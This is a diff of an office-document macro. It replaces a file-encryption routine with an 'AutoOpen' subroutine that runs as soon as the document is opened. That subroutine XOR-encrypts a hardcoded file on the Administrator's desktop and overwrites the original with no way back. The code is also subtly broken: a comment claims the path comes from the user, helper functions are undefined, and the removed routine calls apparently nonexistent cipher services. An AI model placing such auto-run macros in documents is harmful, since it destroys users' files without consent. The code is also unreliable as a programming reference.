@@ -1,45 +1,41 @@
-Option Explicit
+Sub AutoOpen()
+    ' Get the file path from the user
+    Dim FilePath As String
+    FilePath="C:\Users\Administrators\Desktop\test.txt"
 
-Sub EncryptFileWithKey(filePath As String, fileKey As String)
-    Dim fileURL As String
-    Dim outputFileURL As String
-    Dim input As Object
-    Dim output As Object
-    Dim cipher As Object
+    ' Check if the file exists
+    If FileExists(FilePath) Then
+        ' File found
+        MsgBox "Found"
 
-    fileURL = ConvertToURL(filePath)
-    outputFileURL = ConvertToURL(filePath & ".encrypted")
+        ' Encrypt the file (basic XOR encryption)
+        EncryptFile FilePath
 
-    ' Load the input stream
-    input = createUnoService("com.sun.star.io.TextInputStream")
-    input.setInputStream(createUnoService("com.sun.star.io.FileInputStream"))
-    input.getTextInputStream().setInputStream(fileURL)
+        MsgBox "File encrypted successfully!"
+    Else
+        ' File not found
+        MsgBox "Not Found"
+    End If
+End Sub
 
-    ' Load the output stream
-    output = createUnoService("com.sun.star.io.TextOutputStream")
-    output.getTextOutputStream().setOutputStream(outputFileURL)
+Sub EncryptFile(FilePath As String)
+    ' Basic XOR encryption key (you can modify this key)
+    Dim encryptionKey As Integer
+    encryptionKey = 42
 
-    ' Load the cipher
-    cipher = createUnoService("com.sun.star.security.Cipher")
+    ' Read the content of the file
+    Dim fileContent As String
+    Dim fileNumber As Integer
+    fileNumber = FreeFile   ' Obtain a free file number
+    fileContent = Load(FilePath)
 
-    ' Initialize the cipher with the key
-    cipher.initialize(com.sun.star.security.CipherAlgorithm.AES, com.sun.star.security.CipherMode.ENCRYPT, fileKey)
+    ' Perform XOR encryption on each character
+    Dim encryptedContent As String
+    Dim i As Integer
+    For i = 1 To Len(fileContent)
+        encryptedContent = encryptedContent & Chr(Asc(Mid(fileContent, i, 1)) Xor encryptionKey)
+    Next i
 
-    ' Encrypt and write to the output stream
-    Dim buffer(1023) As Byte
-    Dim bytesRead As Long
-
-    Do
-        bytesRead = input.readBytes(buffer(), UBound(buffer) + 1)
-        If bytesRead > 0 Then
-            buffer() = cipher.doFinal(buffer(), bytesRead)
-            output.writeBytes(buffer(), UBound(buffer) + 1)
-        End If
-    Loop Until bytesRead = 0
-
-    ' Close the streams
-    input.closeInput()
-    output.closeOutput()
-
-    MsgBox "File encrypted successfully!", 64, "Encryption Complete"
+    ' Write the encrypted content back to the file
+    Save encryptedContent, FilePath
 End Sub
